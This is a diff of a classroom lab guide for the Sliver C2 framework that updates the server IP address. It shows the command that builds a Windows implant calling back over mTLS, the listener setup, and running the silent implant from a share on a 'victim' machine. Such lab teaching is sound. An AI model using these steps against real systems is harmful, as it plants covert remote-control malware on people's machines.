@@ -32,7 +32,7 @@ You should then see a prompt similar to the one below:
 ### Generating the Implant
 Run the following command to generate the botnet malware. This will take a few minutes and when it completes a new executable with an arbitrary name will be saved in the student directory indicated.
 ```
-generate --mtls 10.1.1.10 --os windows --arch amd64 --format exe
+generate --mtls 10.1.1.20 --os windows --arch amd64 --format exe
 ```
 When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exist the sliver prompt by typing in `exit`.
 ```
@@ -49,7 +49,7 @@ sliver > mtls
 Sliver is now waiting for clients to communicate back with it.
 
 ### Open your Victim Machine
-Then, the malware can be accessed by your Windows server, sliver-victim, by opening a file explorer and navigating to `\\10.1.1.10\sliver`
+Then, the malware can be accessed by your Windows server, sliver-victim, by opening a file explorer and navigating to `\\10.1.1.20\sliver`
 
 Double click to run the executable. Nothing will happen, but the C2 backchannel communication will be established.
 
